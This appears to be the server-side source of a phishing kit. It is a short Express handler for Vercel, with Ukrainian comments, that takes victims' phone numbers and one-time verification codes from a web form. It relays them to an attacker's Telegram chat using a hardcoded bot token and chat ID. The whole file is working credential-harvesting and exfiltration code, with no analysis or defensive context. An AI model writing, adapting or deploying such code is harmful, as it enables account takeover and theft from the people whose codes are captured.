const express = require('express');
const TelegramBot = require('node-telegram-bot-api');

// --- ВАШІ ДАНІ ---
const TELEGRAM_BOT_TOKEN = '7644523613:AAFK-3sc0EaMYb9XirbmiCJt4joBkD3sl0w';
const CHAT_ID = '-4854718691';
// -----------------

const bot = new TelegramBot(TELEGRAM_BOT_TOKEN);
const app = express();

app.use(express.json()); // Middleware to parse JSON bodies

// This is the main handler for all API requests
app.post('/api/submit', async (req, res) => {
    const { type, data } = req.body;
    let message = '';

    if (type === 'phone') {
        message = <b>🔔 Новий номер телефону!</b>\n\n<b>📱 Телефон:</b> <code>${data}</code>;
    } else if (type === 'code') {
        message = <b>🔑 Отримано код!</b>\n\n<b>📱 Телефон:</b> <code>${data.phone}</code>\n<b>🔒 Код:</b> <code>${data.code}</code>;
    } else {
        return res.status(400).json({ error: 'Invalid request type' });
    }

    try {
        await bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
        res.status(200).json({ success: true });
    } catch (error) {
        console.error('Telegram send error:', error);
        res.status(500).json({ error: 'Failed to send message to Telegram' });
    }
});

// Vercel handles the listening part, we just need to export the app.
module.exports = app;
